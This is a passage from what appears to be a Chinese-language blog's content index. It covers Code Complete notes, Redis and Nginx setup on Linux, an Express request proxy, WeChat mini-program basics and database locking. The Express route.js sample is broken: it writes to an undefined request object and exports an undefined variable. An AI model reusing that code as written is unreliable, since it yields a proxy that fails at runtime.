主次注释的区分：如果有些注释是某条主注释的次级注释，最好的办法是将次级注释对应的部分抽象成一个子程序；这样可以避免出现次级注释，使得所有的注释都位于同一个层次； 错误或语言环境的独特点应该添加注释：假如调用某个库函数，发现一个在特定环境下会重现的BUG，则有必要通过注释标明这个BUG，并解释用什么方法绕过它； 为使用不良风格编码给出有力理由：避免别人修改代码，以及留下不好印象； 不要给投机取巧的代码写注释，除非是在维护别人写好的代码；如果代码出现投机取巧，好的做法应该是重构它； 注释数据声明 注释数值单位：例如 distance &#x3D; 1000 &#x2F;&#x2F; in meters，当然，更好的做法是将单位写到变量名里面，如 distanceInMeters &#x3D; 1000 对数值的允许范围给出注释，例如人民币钞票的面额是 1 到 100 元； 注释编码的含义：例如 0 代表直流电，1 代表交流电等（没有枚举类型的情况下）； 注释对数据输入的限制：例如传入的参数、文件和用户输入等；当然，更好的做法是使用 assert 的，这样可以让程序具备自检查的能力（好奇 assert 是否有必要独立成一个子程序？感觉写在代码里面，由于它不可避免出现在开头位置，会影响阅读，没有第一时间突显主要的内容）； 如果注释中含有变量名，则应让变量名也出现在注释中，原因：未来如果修改变量名称，通过搜索匹配时，也能够发现并同时修改注释里面的变量名，避免过时； 注释全局变量：如果使用了全局变量，则应加以注释，解释使用的原因和目的；另外全局变量的命名最好有突出的规范，例如统一加 “g_” 做为前缀； 注释控制结构 在if 或 while 开始前进行注释；if&#x2F;else 注释判断的理由；for or while 循环：注释循环的目的； 如果循环非常长，则在循环结束的时候，注释循环结束；目的：为判断循环是否结束提供线索；此时也同时警觉，循环可能需要进行简化了，最好的办法，是简化到可以不写这种结束注释，除非万不得已； 注释子程序 注释应靠近其说明的位置，避免使用花哨的注释头，最好用1-2句说明完；原因：太多花而不时的东西，会让注释和代码隔得很远；同时杀鸡用牛刀，带来很多工作量，使得人们不敢轻易创建子程序；将来维护起来也很痛苦； 在参数声明处进行行尾注释（唯一可以使用行尾注释的例外情况），如果变量名取得好，一眼就知道它是干嘛的，则可以省掉注释（取变量名值得多花点时间，切莫随便）； 如果有代码文档生成工具（如 Javadoc），则尽量考虑使用，一来有统一的注释位置，二来可以方便的生成文档； 如果子程序很长，可以考虑通过注释，区分输入参数和输出参数；原因：这样对于阅读子程序的人，很容易在脑海中勾勒出关键点； 对假设进行注释，例如：变量状态的假设（合法或不合法的值，排过序的数组、已经初始化或只包含正常值的数据成员等），当意识到自己正在进行接口的假设时，此时应该将其注释记录下来，原因：未来如果出现错误，可以方便的定位，同时也能够提醒自己必要的时候对假设进行检验； 确保注释所有全局变量（最好给全局变量加上 “g_” 的前缀； 对子程序的局限性进行注释：例如计算结果的精确度，计算值的允许范围，能够处理的文件大小上限，异外情况可能采取的默认行为等（虽然这些信息在代码里面有，但注释出来可以让人一眼抓住关键，节省时间）；（我越来越理解代码是用来读的这句话的意思，因为在多人协同工作的程序中，很多代码可能是要供别人调用的，如果没有清楚的注释，会给别人的调用带来很大的痛苦） 说明子程序的全局效果：如果子程序会修改全局数据，务必进行注释说明，描述它对全局数据做了什么（原因：更改全局数据比读取它危险得多）（如果可以的话，我觉得使用另外一个全局变量来保存数据可能更安全）； 注释所用算法的来源：外部文献的来源，或（自行研发）说明文档的存放位置； 用某种规范统一的标记程序的各个部分，例如“&#x2F;**”表示子程序头；”@param”表示参数；“@version”表示版本，”@throw”表示异常等；可以使用常用的规范（例如 Javadoc），如果没有则考虑自行订立规范 注释类、文件和程序 类、文件、程序的共同特征是包含了多个子程序，因此它们的注释的重点在于对其所包含的内容提供有意义的概述性说明，比如说明这些子程序的归类原则； 标注类的一般原则 说明类的设计思路：设计思路有时不容易通过逆向工程获知，提供注释则价值很大，另外注释也可以包括总体设计方法，以及一些曾经考虑过但最后弃用的思路等； 说明局限性和用法假设：类似子程序，包括输入输出数据的假设、出错处理的责任划分、全局效果、算法来源等； 注释类接口：让其他人只看接口说明即知道如何使用的全部信息，而不需要看类的实现，基本的接口说明包括：参数说明、返回值说明（想起了 opencv 的文档，跟这里的描述很相符，未来可以做为参照）； 不要在类的接口说明中包含实现细节； 注释文件的一般原则 在文件头部注释说明该文件的意图和内容：例如如果文件包含多个类，则说明为什么将这些类放在同一个文件中（通常一个类放一个文件，类名和文件名强相关）；如果将程序分为多个文件不是出于模块化考虑，则很有必要做出说明，以便他人理解意图和方便查找内容； 在大型项目中，有必要在文件头注明作者姓名和联系方式（10人以下的小项目如果实行代码共享所有权，可以不用注释，但大项目模块分工独立，无法实现共享，需要注释）； 包含版本控制标记：例如 svn 可以通过插入标记自动生成版本信息； 如果需要，可以包含法律版权信息等； 文件名与内容务必强相关； 程序注释用书籍的编排为参考（opencv 的 python turorial 即是一个好的参照） 书籍的序：提供整体概要性说明； 书籍的目录：提供内容的结构，包括顶层文件、类、子程序等信息，可以是清单的形式，也可以是画成结构图的形式； 书籍的章：类 书籍的节：子程序声明、数据声明、可执行语句； 书籍的附录：交叉引用信息 IEEE标准 对于代码层以外的说明，据说 IEEE 协会发布的各项标准，是一个很好的信息参考来源，包括软件开发标准、质量保证标准、管理标准等； 另外，还有一些书籍对前面这些标准进行整合说明，汇集了各领域顶级专家的经验和智慧结晶，是一个宝库，包括《IEEE 软件工程标准大全》《软件工程标准：用户路线图》等 个人性格 研究发现，个人性格对于造就程序员高手需要决定性的意义 聪明与谦虚：优秀的程序员能够谦虚的承认自己大脑的局限性，会聪明的使用一些辅助工具，来弥补人类大脑的生理局限，包括：将大问题分解成小问题，进行复查&#x2F;评审&#x2F;测试以减少人为错误，将程序写得短小以减少大脑负担，基于问题而不是低层次细节来编程从而减少工作量，通过成熟的规范使用自己的思路从繁琐的编程中解放出来，编写简单容易阅读的代码，方便他人从而减少错误； 求知欲 对技术事务的求知欲，对于能否成为高手，需要绝对性的重要意义；应将学习当做第一要务； 方法 在开发过程中，注意自我成长，如果不能成长，应提出抱怨，甚至更换工作； 做试验：对于不清晰的模糊问题，应通过写个小程序来进行试验，找出不符合预期的原因，不要写大程序试验，得不偿失（最近使用 numpy 的时候深有体会）； 阅读他人的问题解决方法：相同问题，一般不是第一次出现，避免重复造轮子； 在行动之前，做分析和计划；使用伪代码编程； 学习成功项目的开发经验总结：例如人月神话、人件，硝烟中的 Scrum 和 XP；找一些高手编的代码进行阅读，以及渴望了解专家对自己代码的意见； 勤于阅读文档，浏览函数库的使用说明； 阅读好的书籍杂志 同专业人士交往：和同样希望成为高手的人为伍，参加专业的技术交流会议，加入某个用户群，参与网上讨论； 向专业开发看齐：编程工作只有15%的时间和计算机打交道，剩下的都是跟人打交道，因此，为人而不是机器编写代码很重要，再怎么强调都不为过； 诚实 愿意承认自己不知道，乐于承认自己犯下的错误； 不忽视编译器的警告，透彻理解自己的代码，而不是满足能够编译运行； 提供实际的状况报告，提供实际的进度方案，在上司面前坚持自己的意见； 交流与合作：优秀的程序员知道如何与他人融洽的合作和娱乐；明白编码首先是与人的交流，其次才是与计算机的交流； 创造力和纪律：二者并不矛盾，在成熟规范内的创造，远比随意创造更有成效，优秀的艺术总是遵守某种形式上的规则，而不是凭空创作； 偷懒：编写工具完成烦人的任务，实现一劳永逸的偷懒； 其他没有作用的性格因素 坚持：钻牛角尖并不能带来更好的结果，当在设定的时间（例如15分钟）内找不到思路时，应马上考虑暂时离开，换个思路，而不是在同一个地方坚持； 经验：不能与时俱进的话，经验反而有可能是个累赘；原因：软件技术是迅速变化的，经验与工作效能关系不大 疯狂：冷静而清醒，是减少错误的关键，如果把自己搞得很疲惫，反而会犯下大量需要纠正的错误，导致最后的失败； 习惯： 要在一开始的时候，养成好的习惯；因为一旦坏习惯养成，它就会不自觉的保持下去，导致容易重复出现同样的错误，质量得不到提高（是的，看完本书后，我发现自己还有很多的好习惯需要养成）； 纠正办法：找到一个新习惯来代替老习惯；例如伪代码编程，编译前检查代码等； 软件工艺的话题 征服复杂性 编程是一项需要应对计算机和现实世界两种复杂度的工作，因此如何降低复杂度，让工作成果的质量和时间都能得到保证，便是编程的重要使命； 是否降低复杂度，是衡量程序员成果的最重要依据； 精选开发过程 对于单人的小项目，软件质量取决于个人能力；对于多个程序员的项目，软件质量取决于组织能力； 使用好的开发过程，能够最大程度的保证质量，为它付出时间的投资，将具有巨大的回报； 首先为人写程序，其次才是为机器 写让人易懂的代码的好处很多，而且，它写起来并不会更慢，重要的是养成良好的习惯； 超越一门语言去编程，而不是受限于语言的表层局限性 首先根据问题本身寻找解决方案，而不是在语言自身的限制内进行思考；例如： 如果所用语言不支持断言，则编写一个自己的 assert() 子程序； 即使所用语言支持全局变量和 goto，也要尽量避免使用； 如果所有语言不支持枚举类型，则可以制定相关的规范，通过全局变量定义自己的枚举变量或具名常量进行使用； 借助规范集中注意力 规范可以避免因程序员各自采用不用的细节做法，导致彼此之间的理解困难； 规范可以传达重要信息，例如通过添加前缀，一眼即可以识别全局变量、具名常量、变量等； 规范可以避免出现危险的错误：例如给复杂的表达式添加括号，一行只写一条语句等； 规范可以增加对低层工作的可预见性，例如没有全局变量，便不用思考类和子系统之间可能潜在的联系； 规范能够弥补语言的不足之处，例如 python 没有枚举类型和具名常量； 基于问题域编程 在现实世界的抽象世界中进行思考和表达，而不是在语言的实现细节层次思考，不然会陷入各种小细节，让思路迷失在其中，增加大脑的负担；先思考在不懂代码的情况下，问题如何被解决，之后再考虑如何将解决方案用代码写出来；而不是用代码来思考解决方案； 将程序划分为不同层次的抽象，从低到高的抽象 操作系统和机器指令 编程语言自身的内部实现； 低层实现结构：基于编程语言的操作，例如算法、数据结构等 低层问题域：对象和服务层； 高层问题域：基于上一层的组合，面向最终用户的抽象，某种程度上应让最终用户可以大概看懂； 问题域的低层技术：虽然目前并没有系统的结构性方法来实现问题域的抽象，但仍然有一些技术可以辅助实现这个目标，包括： 用类来实现有意义的结构 使用布尔函数，让复杂的判断变量清晰； 有意义的变量命名，例如使用具名常量来描述字符串和文字的意义； 引入中间变量保存中间结果； 隐藏低层数据类型和实现细节； 当心落石 由于程序是由人编写的，而人是很容易犯错的，所以需要对程序中各种可能出现错误的地方保持高度的警惕，这些警惕包括： 编译器的警告信息； 类的成员数量过多，例如有7个以上（说明很可能将过多不属于当前类的操作，混了进来）； 子程序的判断过多，循环嵌套过深，参数过多等； 程序不容易理解； 出现的错误次数过多； 代码出现重复； 未在源头使用避免出错的手段，例如指针释放后置空； 子程序难以测试（表明可能与其他子程序过度耦合） 迭代 由于现实世界的复杂性和不确定性，在产品开发过程中，需求不断迭代是加深对问题领域的了解的必不可少的过程，因为这种了解需要在实证过程中进行，无法凭空想象； 除少需求变化产生的迭代外，开发本身也需要迭代，因为一开始的方案虽然或许可行，但很可能并不是最好的方案，需要在后续过程中不断的调优； 评审能够使开发过程少走弯路，它在编码的早期阶段即引入了迭代；对于评审不通过的编码，即需要返工重新编写； 分离软件与信仰 编程是一种工程技术，这也意味它具备一定的灵活性，同样的问题有不止一种解决方法。在仔细评估各种方法的利弊得失后，可以选择一种比较平衡的方案，并做好备注；避免因为信仰，而刻意丢弃这种灵活性，这样会极大的限制找到最优解； 试验：保持开放的思路，多做试验，寻找最优的方法；如果做试验却不能基于实验结果改变思路，则试验只是浪费时间； 何处有更多的信息 《编程珠玑》 《Conceptual Blockbusting: A Guide to Better Ideas》","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://example.com/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"Linux Redis 安装并设置开机启动","slug":"Linux Redis 安装并设置开机启动","date":"2018-03-15T04:05:32.000Z","updated":"2024-09-21T23:16:43.074Z","comments":true,"path":"2018/03/15/Linux Redis 安装并设置开机启动/","permalink":"http://example.com/2018/03/15/Linux%20Redis%20%E5%AE%89%E8%A3%85%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/","excerpt":"","text":"安装 redis（注：以下是基于 linux 系统）进入源码目录（注：一般将下载的源码文件统一放在这个目录下，当然也可以不放这里，看个人需要）cd /usr/local/src 下载安装包wget http://download.redis.io/releases/redis-4.0.8.tar.gz注：此处假设最新版本为 4.0.8，如果不是要下载这个版本，则相应修改 解压安装包tar -zxvf redis-4.0.8.tar.gz 进入解压后的文件夹cd redis-4.0.8 创建安装目录（注：一般将程序统一安装在 &#x2F;usr&#x2F;local&#x2F; 目录下，当然也可以不放这里，看个人需要）mkdir /usr/local/redis 安装 redis 到以上目录make PREFIX=/usr/local/redis install 检查是否安装成功ls /usr/local/redis/bin如果安装成功，可以看到 bin 目录有以下文件redis-benchmarkredis-check-rdbredis-sentinelredis-check-aofredis-cliredis-server 设置开机自启动复制安装包中 utils 目录下的启动脚本文件 redis_init_script 到文件夹 &#x2F;etc&#x2F;init.d&#x2F; 并命名为 rediscp /usr/local/src/redis-4.0.8/utils/redis_init_script /etc/init.d/redis注：路径 &#x2F;usr&#x2F;local&#x2F;src&#x2F;redis-4.0.8 是按前面步骤的安装包解压后的位置，如果不是则相应修改； 编辑 &#x2F;etc&#x2F;init.d&#x2F;redis 文件打开文件vi /etc/init.d/redis 修改文件内容 第一段末尾添加如下内容 #chkconfig: 2345 80 90 EXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-server 改为 EXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-server注：此处是设定执行文件的路径，以上路径是假设redis 安装的位置在 &#x2F;usr&#x2F;local&#x2F;redis，如果实际不是，则相应修改；以下两点同； CLIEXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-cli 改为 CLIEXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-cli注：此处是设定客户端启动文件的路径； CONF&#x3D;”&#x2F;etc&#x2F;redis&#x2F;${REDISPORT}.conf” 改为 CONF&#x3D;”&#x2F;usr&#x2F;local&#x2F;redis&#x2F;conf&#x2F;${REDISPORT}.conf”注：此处是设定配置文件的路径；注意 redis 下的目录 conf 是要在下一步手工新增 保存退出新增配置文件存放目录mkdir /usr/local/redis/conf 复制安装包中的配置文件 redis.conf 到以上 conf 目录，并重命名为 6379.confcp /usr/local/src/redis-4.0.8/redis.conf /usr/local/redis/conf/6379.conf 编辑配置文件 6379.conf 打开文件 vi /usr/local/redis/conf/6379.conf 修改文件的后台运行选项 找到 daemonize no 那一行， 将其改为 daemonize yes 保存退出 修改启动脚本文件的执行权限chmod +x /etc/init.d/redis 设置开机启动chkconfig redis on 测试启动 redisservice redis start注：如果成功，会提示如下：Starting Redis server… Redis is running… 测试停止 redisservice redis stop 重启服务器reboot 测试客户端 redis-cli/usr/local/redis/bin/redis-cli注：如果成功，提示如下：127.0.0.1:6379","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"Node Express 转发 GET 和 POST 请求","slug":"Node Express 转发 GET 和 POST 请求","date":"2018-03-06T16:02:00.000Z","updated":"2024-09-21T23:17:36.863Z","comments":true,"path":"2018/03/07/Node Express 转发 GET 和 POST 请求/","permalink":"http://example.com/2018/03/07/Node%20Express%20%E8%BD%AC%E5%8F%91%20GET%20%E5%92%8C%20POST%20%E8%AF%B7%E6%B1%82/","excerpt":"","text":"转发GET 和 POST 请求到第三方的 API，实现方式如下，可单独建立一个 route.js 文件供 app.js 主程序文件引用 123456789// ---app.js--- 文件var express = require(&#x27;express&#x27;);var app = express();// 拦截带api字样的urlvar route = require(&#x27;./route.js&#x27;);app.use(&#x27;/api/*&#x27;, route); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// ---route.js 文件---var express = require(&#x27;express&#x27;);var http = require(&#x27;http&#x27;);//如果第三方api是https，则以上为var https = require(&#x27;https&#x27;)//下面的代码 http 处相应更改为 https，并将80端口更新为 443var router = express.Router();var _fn;var apiHost = &#x27;此处填写第三方 api 的域名&#x27; (例如: www.google.com)//转发 get 请求router.get(&#x27;/&#x27;, function(req, res, next)&#123; var path = req.originalUrl; _fn.getData(path, function(data)&#123; res.send(data); &#125;);&#125;);//转发 post 请求router.post(&#x27;/&#x27;, function(req, res, next)&#123; var path = req.originalUrl; var content = req.body; _fn.postData(path, content, function(data)&#123; res.send(data); &#125;);&#125;);_fn = &#123; getData: function(path, callback)&#123; http.get(&#123; hostname: apiHost, path: path &#125;, function(res)&#123; var body = []; res.on(&#x27;data&#x27;, function(chunk)&#123; body.push(chunk); &#125;); res.on(&#x27;end&#x27;, function()&#123; body = Buffer.concat(body); callback(body.toString()); &#125;); &#125;); &#125;, postData: function(path, data, callback)&#123; data = data || &#123;&#125;; content = JSON.stringify(data); var options = &#123; host: apiHost, port: 80, path: path, method: &#x27;POST&#x27;, headers:&#123; &#x27;Content-Type&#x27;: &#x27;multipart/form-data&#x27;, &#x27;Content-Length&#x27;: content.length //根据提交请求类型不同而不同，以上适用多媒体文件 //可查询各种报头类型代表的意思 &#125; &#125;; http.request(options, function(res)&#123; var _data = &#x27;&#x27;; res.on(&#x27;data&#x27;, function(chunk)&#123; _data += chunk; &#125;); res.on(&#x27;end&#x27;, function()&#123; callback(_data); &#125;); &#125;); req.write(content); req.end() &#125;&#125;;module.exports = route;","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题","slug":"阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题","date":"2018-03-04T01:28:46.000Z","updated":"2024-09-21T23:09:00.749Z","comments":true,"path":"2018/03/04/阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题/","permalink":"http://example.com/2018/03/04/%E9%98%BF%E9%87%8C%E4%BA%91%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%20Nginx%20%E7%BC%BA%E5%B0%91%E6%94%AF%E6%8C%81HTTPS%20%E7%9A%84%20SSL-MODULE%20%E9%97%AE%E9%A2%98/","excerpt":"","text":"阿里云轻量应用服务器预安装的 Nginx 默认没有 ssl-module，当需要使用 https 进行访问时，在配置 nginx.conf 并重启后，会提示如下： nginx: [emerg] the “ssl” parameter requires ngx_http_ssl_module in &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 解决办法：在服务器上重装下载 nginx 相应版本的源码包（原因：镜像上面没有源码包；如有，则可不用重新下载，找到源码包所在目录即可），重新编译安装，过程步骤如下： 假设 nginx 安装在如下目录： &#x2F;usr&#x2F;local&#x2F;nginx 运行 cd sbin，进入 sbin 子目录，进入后当前目录为 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin 运行 nginx -V，查看版本信息（目的：获取相同版本的源码包用），假设为 v1.12.1； 回到 &#x2F;usr&#x2F;local 目录， 运行 wget http://nginx.org/download/nginx-1.12.1.tar.gz，获取源码包 运行 tar zxvf nginx-1.12.1.tar.gz，解码 运行 cd nginx-1.12.1，进入包的目录 运行 ./configure --prefix=/usr/local/webserver/nginx --with-http_ssl_module，配置参数 运行 make，编译（注：不要 make install，避免覆盖原有的配置文件）； 运行 cp /usr/local/nginx/sbin/nginx ~/ （复制编译后的需要的新的可执行文件，避免覆盖原有的配置文件） 运行 cp objs/nginx /usr/local/nginx/sbin/（复制编译后的需要的新的可执行文件，避免覆盖原有的配置文件） 完成","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题","slug":"阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题","date":"2018-03-04T01:12:38.000Z","updated":"2024-09-21T23:09:03.319Z","comments":true,"path":"2018/03/04/阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题/","permalink":"http://example.com/2018/03/04/%E9%98%BF%E9%87%8C%E4%BA%91%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%20node%20%E5%92%8C%20npm%20%E5%91%BD%E4%BB%A4%E4%B8%8D%E5%8F%AF%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"阿里云轻量应用服务器，有三种远程连接方式，分别如下： 其中阿里云推荐使用浏览器连接，但连接后，发现 node 和 npm 命令不可用，显示如下： 解决办法：改用本地 putty 客户端使用密钥进行连接","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"微信小程序","slug":"微信小程序","date":"2018-01-04T03:25:00.000Z","updated":"2024-09-22T23:08:41.993Z","comments":true,"path":"2018/01/04/微信小程序/","permalink":"http://example.com/2018/01/04/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"开发事项 页面的展示； 页面上的用户交互事件； 页面间的切换逻辑； 数据存储与网络调用； 前端架构 service：业务逻辑层，按业务类型整合相关的方法，向上暴露接口，降低表现层对业务逻辑的关注； pages：表现层，一个页面一个文件夹，放置这个页面涉及的资源； common：放置一些和项目相关的公共代码，如转码，工具包，公共样式设置等； lib：放置一些最底层、第三方的库； widgets：一些通用的带UI的小组件，独立闭环的交互； 项目目录 全局 app.js：小程序的全局脚本文件，用来监听并处理小程序的生命周期函数，声明全局变量，调用API等； App({ onLaunch: function( ){ }, &#x2F;&#x2F;启动时的初始化操作 onShow: function( ){ }, &#x2F;&#x2F;从后台进入前台的操作； onHide: function( ){ }, &#x2F;&#x2F;从前台进入后台的操作 globalConf: { indexDate: ‘’, matchDate: ‘’ } globalData: ‘’ )} app.json：小程序的全局配置文件，会被页面继承；当页面有设置自己的配件文件时，则以页面自己的为准； app.wxss：全局样式文件； 页面 pages page1 page1.js Page({ data: {}, &#x2F;&#x2F;页面数据 onLoad: function( ){ }, &#x2F;&#x2F;页面加载时的初始化操作； onReady: function( ){ }, &#x2F;&#x2F;加载就绪后的操作； onShow: function( ){ }, &#x2F;&#x2F;页面打开时的操作； onHide: function( ){ }, &#x2F;&#x2F;页面隐藏时的操作； onUnLoad: function( ){ }, &#x2F;&#x2F;页面关闭时的操作； viewTap: function( ){ &#x2F;&#x2F;页面元素事件触发的操作； this.setData({ test: ‘set some data for updating now’ }) } page1.json page1.wxss page2 …（略） 两个开发步骤 创建实例：即编写3个 app 前缀的文件，定义、配置及页面执行关联； 创建页面：编写页面结构与事务处理逻辑； MIMA架构示意图 1. 结构 页面层 逻辑层 数据层 页面临时数据或缓存：在 Page( ) 中，使用 setData 函数，将数据从逻辑层发往视图层； 文件存储（本地存储），使用以下3个API： wx.getStorage：获取本地数据缓存； wx.setStorage：设置本地数据缓存； wx.clearStorage：清除本地数据缓存； 网络存储和调用 wx.request：发起网络请求； wx.uploadFile：上传文件 wx.downloadFile：下载文件； wx.navigateTo：新窗口打开新页面； wx.redirectTo：原窗口打开新页面； 开发流程 配置 全局配置：app.json 页面配置：page.json 逻辑层 注册程序：app( ) 方法 注册页面：page( ) 方法 模块化 将一些公共的代码抽离一个或多个单独的 js 文件，作为一个模块； 模块通过 module.exports 对外暴露接口以供其他 js 文件引入使用，示例如下： &#x2F;&#x2F; common.js function sayHello(name) { console.log(‘Hello ‘ + name + ‘!’) } module.exports &#x3D; { sayHello: sayHello } &#x2F;&#x2F; call.js 引用的文件 var common &#x3D; require(‘common.js’) Page({ helloMIMA: function( ){ common.sayHello(‘MIMA’) &#x2F;&#x2F;使用的场景； } 微信的原生 API 八大类：网络、媒体、文件、数据缓存、位置、设备、界面、微信开放接口； API 的名字如果以 on 开头，例如 wx.onSocketOpen，表示监听某个事件发生，它接受一个回调函数为参数，当事件触发时，会调用这个回调函数； 其他 API 接口接受一个 Object 对象做为参数，这个对象可以指定 success、fail、complete 三个参数，参数值为函数，分别代表接口调用成功、失败、完成后要执行的回调函数； 视图层 WXML 数据绑定 简单绑定 运算：三元运算&#123;&#123; flag? true : false &#125;&#125;、算数运算&#123;&#123; a + b &#125;&#125;、逻辑判断&#123;&#123; length > 5 &#125;&#125;、字符串运算&#123;&#123; \"hello\" + name &#125;&#125;、数据路径运算&#123;&#123; object.key &#125;&#125;, &#123;&#123; array[0] &#125;&#125;； 组合：在花括号内组合元素，组成新的数组或对象、支持扩展运算符展开对象 1&#123;&#123;[ zero, 1, 2, 3 ], Data: &#123; zero: 0 &#125;&#125;&#125;； 条件语句 wx: if 和 wx: else 可以通过 block 加条件，一次判断多个标签； 列表语句 wx: for，数组当前项的下标变量名默认为 index，变量名默认为 item； 使用 wx: for-item 和 wx: for-index 可以用来指定元素和下标的变量名，例如： wx: for-item &#x3D; “itemName” wx: for-index &#x3D; “indexName” wx: for 支持嵌套； 同样可以通过 block 来渲染一个包含多个节点的块； 可以使用 wx: key 来指定项目的唯一标识符，并进行需要的操作，例如固定位置的排序 方法示例：给对象增加一个 unique 属性，然后每个 item 这个属性的值不同，然后在标签中设置 wx: key &#x3D; unique；由于每个 key 的值不同，这样就可以通过 unique 的值来唯一标识每个标签，对其进行操作； 模板 可以通过定义模板 &lt;template name = &quot;templName&quot;&gt;，在模板内放代码段，然后通过 &lt;template is=&quot;templName&quot; data = &quot;&#123;&#123;... item&#125;&#125;&quot;&gt; 来引用模板； 模板有自己的作用域，只能使用 data 属性传入的数据； is 属性可以通过花括号放入语句来做一些运算，例如动态判断采用哪个模板名字，以渲染哪个模板，例如 is=&quot;&#123;&#123; value? even : odd &#125;&#125;“ 引用 import 通过 import 可以在当前文件中使用目标文件定义的 template； import 有作用域的限制，只能一层，不能嵌套，即 A 引用 B ，B 引用 C，则 A 可以使用在 B 中定义的模板，但不能使用 C 中定义的模板； include include 可以将目标文件除模板代码块（）的所有代码引入，相当于拷贝到 include 的位置； 事件绑定 与用户交互一般通过事件来进行，在组件上面绑定事件名称，被触发时，到该页面对应的 Page 实例中寻找对应的事件处理函数，参数是 event； 事件类型 冒泡事件：触发后，会向父级节点传递；共有6个，分别为 touchstart：触摸 touchmove：触摸后移动 touchcancel：触摸中断 touchend：触摸结束 tap：点击 longtap：长点击 非冒泡事件：触发后，不会向父级节点传递；除了以上6个冒泡事件外，其他事件都是非冒泡事件； 冒泡的意思是，如果它被点击了，则它会触发它的父级节点上的事件，直到被阻止，或者到达根节点； 事件写法： key：以 bind 或 catch 开头，然后加上事件的类型，例如 bindtap, catchtouchstart；注：bind 不会阻止冒泡， catch 会阻止冒泡； value：一个字符串，对应 Page 中定义的同名函数； 事件对象的属性 type：字符串，事件类型 timeStamp：整数，当前页面打开，到事件触发，经过的毫秒数； target：对象，事件触发的源组件 currentTarget：对象，事件触发的当前组件（如果是冒泡事件，父级组件的事件的 currentTarget 即是父级组件，而非源组件） touches：数组，触摸点信息的数组 changeTouches：数组，变化的解摸点信息的数组； detail：对象，其他额外的信息； 错误集 页面间传递数据的方法 在 app.js 中定义全局变量，由各个页面按需要赋值和获取； 在缓存中定义属性值存储，由 setStorage 和 getStorage 方法进行赋值和读取； 通过事件的 id 和 dataset 属性传递值到 js 逻辑层，然后在 navigate 或 redirectTo 的 url 中赋值参数，最后通过新页面的 onLoad 初始化的 options 参数获取值； 通过 组件中的 url 属性中赋值参数； 如果想要在子元素中使用 width: 100% 或 height: 100%，则首先需要在其父级以上的元素中定义相应的宽度值，因为这个 100% 是相对父元素而言的，它的表现取决于父元素的实际宽度是多少； 元素有一个 open-type 元素有默认的 css 样式，如果要去除边框，需要使用 .class-name::after {border: none} 来实现； 更新 data 某个对象的属性值 var prop &#x3D; ‘obj.key’ this.setData({ }) scroll-view 有一个BUG，当内部元素的样式不完全一致时，不会对齐，需要在 scroll-view 内部嵌套一层 view 用来放置各元素，才可以控制； R.map 如何解决需要传入两个参数的问题？","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"http://example.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}]},{"title":"数据库查询并更新的锁定","slug":"数据库查询并更新的锁定","date":"2018-01-03T10:39:23.000Z","updated":"2024-09-21T23:12:04.534Z","comments":true,"path":"2018/01/03/数据库查询并更新的锁定/","permalink":"http://example.com/2018/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%B9%B6%E6%9B%B4%E6%96%B0%E7%9A%84%E9%94%81%E5%AE%9A/","excerpt":"","text":"方案一：使用 select for update 命令；方案二：在表中增加一个字段 version，int 类型，查询时，同时读取这个字段，更新时，判断这个字段与查询时获得的值相同，如果相同，更新记录并将 version 